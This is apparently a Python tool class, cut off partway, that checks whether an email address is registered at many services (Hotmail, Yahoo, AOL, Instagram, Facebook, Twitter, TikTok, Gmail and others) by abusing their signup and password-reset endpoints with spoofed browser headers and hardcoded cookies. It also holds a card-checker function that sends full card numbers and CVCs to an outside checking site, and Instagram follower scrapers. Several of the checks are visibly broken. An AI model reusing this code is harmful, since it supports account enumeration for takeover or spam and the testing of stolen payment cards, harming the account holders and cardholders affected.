try:
    import requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import random
    import names
    import requests, random, string
    import uuid
    import instaloader
    import hashlib
    import urllib
    import mechanize
    import json
    import secrets
except ModuleNotFoundError:
    import os
    os.system("pip install requests")
    os.system("pip install uuid")
    os.system("pip install user_agent")
    os.system("pip install random")
    os.system("pip install names")
    os.system("pip install string")
    os.system("pip install uuid")
    os.system("pip install instaloader")
    os.system("pip install hashlib")
    os.system("pip install urllib")
    os.system("pip install mechanize")
    os.system("pip install secrets")
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;39m' 
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
Nova = 'My Channel @VZX_TEAM'
uid = str(uuid4)
class Tools:
    def check_email_hotmail(email: str) -> str:
    	url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
    	headers = {
    	    "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": str(generate_user_agent()),
            "Connection": "close",
            "Host": "odc.officeapps.live.com",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
            "uaid": "d06e1498e7ed4def9078bd46883f187b",
            "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
    	res = requests.post(url, data="", headers=headers).text
    	if ("Neither") in res:
    		return {'status': 'Success', 'email': 'True'}
    	else:
            return {'email': email,'The resulting':'False'}

    def check_email_outlook(email: str) -> str:
        url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": str(generate_user_agent()),
            "Connection": "close",
            "Host": "odc.officeapps.live.com",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
            "uaid": "d06e1498e7ed4def9078bd46883f187b",
            "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
        res = requests.post(url, data="", headers=headers).text
        if ("Neither") in res:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_mailru(email: str) -> str:
        url = "https://account.mail.ru/api/v1/user/exists"
        headers = {
            "User-Agent": str(generate_user_agent())}
        data = {'email': str(email)}
        res = requests.post(url, data=data, headers=headers)
        if str(res.json()['body']['exists']) == False:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_yahoo(email: str) -> str:
        email = str(email)
        email = email.split('@')[0]
        url = "https://login.yahoo.com/account/module/create?validateField=userId"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '7423',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': 'PH=l=en-JO; cmp=t=1649967133&j=0; OTH=v=1&d=eyJraWQiOiIwMTY0MGY5MDNhMjRlMWMxZjA5N2ViZGEyZDA5YjE5NmM5ZGUzZWQ5IiwiYWxnIjoiUlMyNTYifQ.eyJjdSI6eyJndWlkIjoiUVM0Uk1FNVM1NTdEQlg2TTdOVFFRUTdHTlUiLCJwZXJzaXN0ZW50Ijp0cnVlLCJzaWQiOiJERWI2ZmRZN1BwQVUifX0.qS4v0LTtpXd4vhydwS6vpL9MANSOMDMZEYWffFSxshbnuwRCzeUzJbwM2p7nPMwYV96yEFCkM0B8Lo--XHoBQvQszdP_-M-HuzLttwUwkzkqDpZyo6Lzm5bAnbh6B3P-kTcNBHlCoSg9N-SExB0OrppOO2gONQqoR25mLHXhhnY; A1=d=AQABBB409GECEJnQ0nfMctyiH6Cq-PmrCeMFEgEABgLQWWIzY2Jcb2UB_eMBAAcIHjT0YfmrCeMID9DBO57ZmNoDBDj1XbSi9wkBBwoB3w&S=AQAAAjb2LJb55ay2ij3P5hQhTG8; A3=d=AQABBB409GECEJnQ0nfMctyiH6Cq-PmrCeMFEgEABgLQWWIzY2Jcb2UB_eMBAAcIHjT0YfmrCeMID9DBO57ZmNoDBDj1XbSi9wkBBwoB3w&S=AQAAAjb2LJb55ay2ij3P5hQhTG8; B=e62dbv5gv8d0u&b=4&d=6ZQJIRhtYFgpJyr7JyZD&s=1a&i=0ME7ntmY2gMEOPVdtKL3; GUC=AQEABgJiWdBjM0Id8gRd; FS=v=1&d=Sloq608oHDIvM2JuXcI4Gn9LK3_mICxQM3wH9IpTUuhixjO_VCNu~A; F=d=Gd70Kyk9vQ--; A1S=d=AQABBB409GECEJnQ0nfMctyiH6Cq-PmrCeMFEgEABgLQWWIzY2Jcb2UB_eMBAAcIHjT0YfmrCeMID9DBO57ZmNoDBDj1XbSi9wkBBwoB3w&S=AQAAAjb2LJb55ay2ij3P5hQhTG8&j=WORLD; AS=v=1&s=Cgvhb3Xg&d=A627bc5c4|SI2GnZf.2Sr3BNg89zpo_CsNpKuGFl4HUY7VHVfbraWyc8Ii93qDVlDfOt1BfiR7XCEZ21NvQDWrQraqbYJyOJYpsIH0OvCsxXiN8AGzuKcqHrgfGUtOZZrzS7O.VkvbdCiSNYD_w9OB6ML3Y8NMOiMYT_MiAgefNsF_54dXFyJdm4rdq1W.bJhN_PLPvnrKNDEd7saaFV3TnLk.b.kYolEgMoWWAkD71Of5UCjkqQNaQk8RIunPxxXkRXHZwr1ypRWsnBEuqv5oQrEDCiqHFvF8u25Ofg2gKdnPDbFeJ9RleaTB45uuY5sZUv1mdsokSKD6_ahRvGkWfTnrPZzt6E28PE28s0fooo2qY3yUltuO1w.xKUCKkKbWJQyjxXpqTm3hgOwJ66.3I2TIf5r0vA0r43pnZVLl2rttIk4R1ABgy9Wy7OOqga8ZVE3o1l0hHz419cDgN1Hzb0Fexz..nP9ME4F7VWfn8oo.k9pMZYDtHhRMM1kGGmsex0pBbD.QdtUhpuVR4oHP_U7ap4DOcKCGYp2XVml6Z.9xRcb3m_VOukhZ1zwEpcjT6xXJAjZ7AgfC3l7QBLw2NnD0Mtuqh35qDDEABh4dM.YlhgT72EYqSbl8MnvZ7W1q0bk3SMaqQdwbAGle4W1j_uPr0yu90HSPNKzeQ2K5GsPumTtVNzT353rVPBfwGAIDMe1wqR5csd8SV4iFjZ8Y6r..RZT_XsKxT2JOL1QhaTFkx0INLwy88kv._Vv_cBMwcEYUz0LQ9OLwajl6R7b5AYwwk.B4EXpf7DzynJaWtaerDs461oLGbqD_ljVUdWAy.U5mcYXnWqzqseI7fC6W4HvXdAaCIC2qmrAgjow9hJqXDIvkXODlsrZ.usoNnX44L7X8ybtYCKvH4RcQttBv6b0X2jcI~A|B627bc602|8.xHz7z.2TpHZLxVO1hodGUaeVUeU4gERiIt7J2uXM7cv4.YcovtTNaxgcIeRQzeGiqrbxcu1WyDHogAGcIglonu5OSTNDoMeCDAxtZH1Od166YwYdZDIzr0hcNc_epXkOw1KoLhXbyBR5MCTGhdrG0BJoG5njJC9n5N2JJx2P0aWBC9bPoIThLWGi9Wf8wfI4MP3mhqA9lF2eFUkQEX6A2CiocpPLhQbmtgRKbVM1Q3ncBSeVaKuhQOqNcvHOqCSLgppcJg2sBtkJLzet12UCSy8JORfHf6Dc3DMT8QgifRRoGTBoAGs_SOI6hOcNExCo9D5ImvN.lKHPMymFxqnW4pVaq2PBcY7f2t4xNLcqBYPV.O2TCmgvni7WYaq7A0zYaQCJWFcBkzB4BcXX19s8Eeidj213exUfkBq8zgrPQsB0IPQD0KCe.LXf6hNY1dr4vp1rTBLRchdHhzbM2upz50JIDW87taVyq.ZU04zTTOg4KQwv9Hn9poWN_Y2VeiU68nclbo60iQRPXCa5mqucblBHNAxUHuGNiUlD5xYj3N2W.oiUMs7_9esA3eOUubDjN8vj_FAqE9IKrJqNiyOkWOniHFTJ77toR.uk1PW8Bo21lZocUzsa1s9WdzLC5HusiiMErYDEnMdRIyu8_.ZxCeKhvNbi8cbSI3.ZentJbZMr1y5sZrarxJCGi1OGoUBEuHWbaZsRASqKJMiX4I95kvg.aFU6XlIQCbKbVyJPCnf7lMb0bEsP6oYnEiqlME_r8ejtGRi9Nu1vgt5HvJaEjwOlYHZnmO21kqttxWUkhORs_He7F81_HHtWVAez1R6a2WP3qh1MT14ppKSBr6851gallOGB0AJOi2P.9vJaPSwzunhCFzWdpgLH9rx4LTKgseKH1NLyrsvKnmf.AMPdYnZR1NBJSvBJ9kknOWSXWyNFcfOgVyUaHzJKMG.QF.JC3DqEcIsJCW7w12wCyb422YcTwgWhUK1I19S8w9HjhiYg--~A',
            'origin': 'https://login.yahoo.com',
            'referer': 'https://login.yahoo.com/account/create?.intl=xa&.lang=ar&src=ym&specId=yidregsimplified&activity=mail-direct&pspid=959521375&.done=https%3A%2F%2Fmail.yahoo.com%2Fm%2F%3F.intl%3Dxa%26.lang%3Dar&done=https%3A%2F%2Fmail.yahoo.com%2Fm%2F%3F.intl%3Dxa%26.lang%3Dar&intl=xa&context=reg',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()), }
        data = {
            'browser-fp-data': '{"language":"ar","colorDepth":24,"deviceMemory":4,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-180,"timezone":"Asia/Riyadh","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":5,"hash":"2c14024bf8584c3f7f63f24ea490e812"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 4600 Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":48,"hash":"62d5bbf307ed9e959ad3d5ad6ccd3951"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1652192386973,"render":1652192386434}}',
            'specId': 'yidregsimplified',
            'crumb': 'IHW88p4nwpv',
            'acrumb': 'Cgvhb3Xg',
            'userid-domain': 'yahoo',
            'userId': str(email),
            'password': '@NovaTools', }
        res = requests.post(url, headers=headers, data=data).text
        if ("userId") in res:
            return {'email': email,'The resulting':'False'}

        else:
            return {'email': email,'The resulting':'True'}

    def check_email_aol(email: str) -> str:
        email = str(email)
        email = email.split('@')[0]
        url = 'https://login.aol.com/account/module/create?validateField=yid'
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '18023',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': 'A1=d=AQABBGBeeWICEBR5epkCARe46kFw6ViOQ_AFEgEBAQGvemKDYgAAAAAA_eMAAA&S=AQAAAp3JQ6CyW2qRJcMsBzHGVvU; A3=d=AQABBGBeeWICEBR5epkCARe46kFw6ViOQ_AFEgEBAQGvemKDYgAAAAAA_eMAAA&S=AQAAAp3JQ6CyW2qRJcMsBzHGVvU; A1S=d=AQABBGBeeWICEBR5epkCARe46kFw6ViOQ_AFEgEBAQGvemKDYgAAAAAA_eMAAA&S=AQAAAp3JQ6CyW2qRJcMsBzHGVvU&j=WORLD; GUC=AQEBAQFieq9ig0IfzwR5; rxx=2bkczirpbih.2q6rpdsb&v=1; AS=v=1&s=JYNxcuAB&d=A627ab0eb|5n7NNlX.2Tqja_1ZC6lprFtAflUVdSswdgLRxIPQFqE9yPLfNXNQGllEgjcaz2MSyNOF0HA9XirM0hGhPu6hRyuyv6NS5uzzU2MRaRQf.1YBAQ8FypG1m_xQXAtuSInDrAwsMOptRW4zfkTgorDT4mTAhLg6RTvtz.RlGfCdtaQ4BBDOfp7jAYaYk.VJlzoY75HEqitjywIRo5cxa2LE6o5SUyxNOi7S_X3k_SPXAVdV.Pie3M8oZSqscWmfYaFDf586bpqdXlRbtd9NfqqCnsm39F_qAPBPvWHWieu4eZ4Guhk.MRMp7Daew_rlTFks0DO5LZYOCyO3RrW3LO3QaHRTvTBTaXP4RsdfXTOXPejofBwqmWSbUlACa4xD1EKndabLWQmEoy1AEUMoSbwgJMxI_j7xuQHqBgjCanjm8A6GOXCZKM44DjwdQdaMnR6GrHEfBfKds9z.7gjHKBoZ2jkWj7Hk7hPMzDGRBkqU.TWCGZRumYVYV8blYxEIS.H9qySKbh3SBBI8MIgkMqBNciHX3QnqQrc_CuA1uBOx7GHKgnI7pemzJnVMGwyYsAGU4UQRwAVGcDrHZH76hH..grS5ceMIZJSVt6nAcvYiTMElRUgLqk4RORTkyF9XbLMB9_U2I_ZVaERHP3X7j7f77RdHq2UlR68eZ_G5RY6ZrgfwFvy1Ptrd9WdFYaab69sfGI8SVXk2dtdR5udVorhaBdtoNxJ5PIy0Ue_qMPhxcsw4VzSExlyyNSaF0SFoSH5fK8kFVQ0IIBIWO_d0ik6d9azkHxffaa7MJpjYfsHmHpERb2hEkyr7uJzTQTf0H8NBfQdcQD8P9ja69DD7Ahdacge_a9D4QGaLgMvQi481iZMNd5Dy46uoeco5T.slB_psK4WxbBJgP7p6hgyb_wkDzvUhd_3ym5sQe1cBySzHgXSMyzsEurBQZKaMHv9302Cj6iNUZ2jjtMkAVdsh~A|B627ab2cd|x0gk8rH.2TpbbztShpG57nIccQOKaEGxqulmFIimnSbIetxQBy35pQAyeLh0g4kZXfUcZ8gS0KtJhnntdd169n74ag_k2YnldeTcAixJ8Oe1U9eEwr4TEKjAn5ew0omTSMojewjLD76vbkEv.zZYyCrRxd5vfs3vmQxAV_f6Y0sOWtsUeIu3OvEzUyK.1trUfGvmn7d3hvyFbF.OTRqd._NMsXRn2QVZ.T5RjYrog5983WaKy_9x1YPoBUNH4QPKi0zZBP9iMgx8Tlsrxhn4zs9Zyr3IiqPFbxjEuBh4G78xoEv7z6_PrYOwB37XEbTdaaeXyPFsSGhZf4bQovQopXVbHe.9nbDzDYkfdXD6d9wmf6jvSEex9a9eEu8Z.14NuIQZJcy_c6_PP5H0eXQAWO6LOsW7CtqdeDlLd74M9jUU5yseMxzkN0HSawwGQ.HU.XZFjoOjowHAX1bsDGRuWObSamI1LdvanTCHZZ6TICNO8lT9GjBWDYK.h6.ojgs.tCAAXzYPMf6UOHvrjtlwaCmODGFlndZMASPIp9IyDMRT9gC52spPRpBQJZOpJUt8YDEY6zKB5r2SsHH.ssGgtrnS3tlCg6rx8k.wEakhoSpj2ezEMO4IAODDXV0paODum6McXkpaxliXReHLYdtXIM9t5smt_PeP92ttd69oDB.zVFsEms7tdF1SQWbmUF.4plddWEwfn6FNVdj7TpJvpTAxjaso_xliccUrnkpUGvH1IUv11w4Pok0k92JLzk2AXJ5Ak_5R51n2X_Oc88nJKif3EZK7ly7lgMXtWaURJx2Zj4.88SxdyHNtRzmHFvkAwmxtDmjgj5OCF7m38h.4TZuT3.D3c7uhs0XPEZARricsnApvw1dUBRY0E3vvSU.S_4zHPhWn7BHQz1nySvei.tQaogRmeBpFHvzS3QNKSWksRu1w7T8O2RDtnr7pzs5VzPifkiXOKw--~A',
            'origin': 'https://login.aol.com',
            'referer': 'https://login.aol.com/account/module/create?validateField=yid%5C',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-requested-with': 'XMLHttpRequest', }
        data = {
            'browser-fp-data': '{"language":"ar","colorDepth":24,"deviceMemory":4,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-180,"timezone":"Asia/Riyadh","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":5,"hash":"2c14024bf8584c3f7f63f24ea490e812"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 4600 Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":48,"hash":"62d5bbf307ed9e959ad3d5ad6ccd3951"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1652124464147,"render":1652124464497}}',
            'specId': 'yidReg',
            'crumb': 'YLO.LxuwQbD',
            'acrumb': 'JYNxcuAB',
            'done': 'https://www.aol.com',
            'tos0': 'oath_freereg|us|en-US',
            'yid': str(email),
            'password': '@NovaTools',
            'shortCountryCode': 'US'}
        res = requests.post(url, headers=headers, data=data).text
        if ('"yid"') in res:
            return {'email': email,'The resulting':'False'}

        else:
            return {'email': email,'The resulting':'True'}

    def check_email_instagram(email: str) -> str:
        url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
            'content-length': '61',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/',
            'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
            'x-instagram-ajax': '72bda6b1d047',
            'x-requested-with': 'XMLHttpRequest'}
        data = {
            'email': str(email),
            'username': str(email),
            'first_name': '@NovaTools',
            'opt_into_one_tap': 'false'}
        try:
            res = requests.post(url, data=data, headers=headers).json()["errors"]["email"]
            return {'email': email,'The resulting':'True'}

        except:
            return {'email': email,'The resulting':'False'}

    def check_email_facebook(email: str) -> str:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.addheaders = [('User-agent',
                          'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2821.96 Safari/537.36')]
        br.open(
            "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1")
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form["email"] = email
        br.submit()
        res = br.geturl()
        if "https://mbasic.facebook.com/login/device-based/ar/login/?ldata=" in res:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_twitter(email: str) -> str:
        rs = requests.Session()
        url = f"https://api.twitter.com/i/users/email_available.json?email={email}"
        rs.headers = {
            'User-Agent': generate_user_agent(),
            'Host': "api.twitter.com",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", }
        res = rs.get(url).json()
        if res['valid'] == True:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_tiktok(email: str) -> str:
        url = "https://api2-t2.musical.ly/aweme/v1/passport/find-password-via-email/?version_code=7.6.0&language=ar&app_name=musical_ly&vid=43647C38-9344-40A3-AD8E-29F6C7B987E4&app_version=7.6.0&is_my_cn=0&channel=App%20Store&mcc_mnc=&device_id=6999590732555060741&tz_offset=10800&account_region=&sys_region=SA&aid=1233&screen_width=1242&openudid=a0594f8115e0a1a51e1a31490aeef9afc2409ff4&os_api=18&ac=WIFI&os_version=12.5.4&app_language=ar&tz_name=Asia/Riyadh&device_platform=iphone&build_number=76001&iid=7021194671750481669&device_type=iPhone7,1&idfa=20DB6089-D1C6-49EF-8943-9C310C8F1B5D&mas=002ed4fcfe1207217efade4142d0b05e0c845e118f07206205d6a8&as=a11664d78a2e110bd08018&ts=16347494182"
        headers = {
            'Host': 'api2-t2.musical.ly',
            'Cookie': 'store-country-code=sa; store-idc=alisg; install_id=7021194671750481669; odin_tt=7b67a77e780e497b1c89d483072f567580c860fe622a9ad519c8af998a287f424ed5f97297928981fa70ca6e8cb2648ebc46af23c9c9588a540567c77f877d307588080b16d8b92d3c3f875da9cd2291; ttreq=1$ee9fd401f276e956ba82d3ffd7392ffa6829472d',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': str(generate_user_agent()),
            'Accept-Language': 'ar-SA;q=1',
            'Content-Length': '25',
            'Connection': 'close'}
        data = {"email": email}
        req = requests.post(url, headers=headers, data=data)
        if "Sent successfully" in req.text:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_epicgames(email: str) -> str:
        url = "https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/sendFriendRequest"
        data = f"inputEmail={email}&tab=connections"
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'fr-FR,fr;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Host': 'accounts.launcher-website-prod07.ol.epicgames.com',
            'Origin': 'https://accounts.launcher-website-prod07.ol.epicgames.com',
            'Pragma': 'no-cache',
            'Referer': 'https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/addFriends',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': str(generate_user_agent()), }
        req = requests.post(url, headers=headers, data=data)
        if ("fieldValidationError") in req.cookies:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_godaddy(email: str) -> str:
        url = "https://sso.godaddy.com/v1/api/idp/recovery/password/?username={email}&app=dashboard.api"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': '*/*', }
        req = requests.post(url, headers=headers)
        if ("account_email") in req.cookies:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_gap(email: str) -> str:
        url = "https://secure-www.gap.com/my-account/xapi/v2/create-account/verify-email"
        data = {'emailAddress': f'{email}'}
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Host': 'secure-www.gap.com',
            'Origin': 'https://secure-www.gap.com',
            'Referer': 'https://secure-www.gap.com/my-account/sign-in',
            'User-Agent': str(generate_user_agent()), }
        req = requests.post(url, headers=headers, data=data)
        if ("isEmailRegistered:false") in req.cookies:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_noon(email: str) -> str:
        url = "https://login.noon.com/_svc/customer-v1/auth/reset_password"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'origin': 'https://login.noon.com',
            'referer': 'https://login.noon.com/uae-en/reset', }
        data = {'email': str(email), }
        req = requests.post(url, headers=headers, data=data)
        if ("ok") in req.cookies:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_email_sendgrid(email: str) -> str:
        url = "https://api.sendgrid.com/v3/public/signup/username/{email}"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': '*/*', }
        req = requests.post(url, headers=headers)
        if ("Contains:204") in req.cookies:
            return {'email': email,'The resulting':'True'}

        else:
            return {'email': email,'The resulting':'False'}

    def check_visa_card(cc: str, mm: str, yy: str, cvc: str) -> str:
        card = str(f"{cc}|{mm}|{yy}|{cvc}")
        url = "https://checker.visatk.com/ccn1/alien07.php"
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Length': '57',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': '__gads=ID=42ac6c196f03a9b4-2279e5ef3fcd001d:T=1645035753:RT=1645035753:S=ALNI_MZL7kDSE4lwgNP0MHtSLy_PyyPW3w; PHPSESSID=tdsh3u2p5niangsvip3gvvbc12',
            'Host': 'checker.visatk.com',
            'Origin': 'https://checker.visatk.com',
            'Referer': 'https://checker.visatk.com/ccn1/',
            'sec-ch-ua': '"Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': str(generate_user_agent)}
        data = {
            'ajax': '1',
            'do': 'check',
            'cclist': card}
        req = requests.post(url, headers=headers, data=data).text
        if '"error":0' in req:
            many = req.split("[Charge :<font color=green>")[1].split("</font>] [BIN:")[0]
            message = {'status': 'Success', 'many': str(many), 'Card': str(card)}
            return message

        else:
            return False
    def check_email_gmail(email : str) -> str:
    	url = 'https://android.clients.google.com/setup/checkavail'
    	headers = {
            'Content-Length': '98',
            'Content-Type': 'text/plain; charset=UTF-8',
            'Host': 'android.clients.google.com',
            'Connection': 'Keep-Alive',
            'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)', }
    	data = json.dumps({
            'username': str(email),
            'version': '3',
            'firstName': 'The Jordan',
            'lastName': 'Ghost'}) 	
    	res = requests.post(url, data=data, headers=headers)
    	if res.json()['status'] == 'SUCCESS':
    		return {'email': email,'The resulting':'True'}
    	else:
            return {'email': email,'The resulting':'False'}
            
    def get_users_following(username: str, password: str, name: str) -> str:
        s = instaloader.Instaloader()
        try:
            s.login(username, password)
            profile = instaloader.Profile.from_username(s.context, name)
            follow_list = []
            for follow in profile.get_followees():
                user = str(follow)
                uu = user.split('Profile ')[1]
                users = uu.split('(')[0]
                follow_list.append(users)

            return follow_list

        except:
            return {'The resulting': 'False', 'login': 'False'}

    def get_users_followers(username: str, password: str, name: str) -> str:
        s = instaloader.Instaloader()
        try:
            s.login(username, password)
            profile = instaloader.Profile.from_username(s.context, name)
            follow_list = []
            for follow in profile.get_followers():
                user = str(follow)
                uu = user.split('Profile ')[1]
                users = uu.split('(')[0]
                follow_list.append(users)

            return follow_list

        except:
            return {'The resulting': 'False', 'login': 'False'}

    def get_ids_following(username: str, password: str, name: str) -> str:
        L = instaloader.Instaloader()
        try:
            L.login(username, password)
            profile = instaloader.Profile.from_username(L.context, name)
            follow_list = []
            for follow in profile.get_followees():
                user = str(follow)
                idd = user.split('(')[1]
                id = idd.split(')')[0]
                follow_list.append(id)

            return follow_list

        except:
            return {'The resulting': 'False', 'login': 'False'}

    def get_ids_followers(username: str, password: str, name: str) -> str:
        L = instaloader.Instaloader()
        try:
            L.login(username, password)
            profile = instaloader.Profile.from_username(L.context, name)
            follow_list = []
            for follow in profile.get_followers():
                user = str(follow)
                idd = user.split('(')[1]
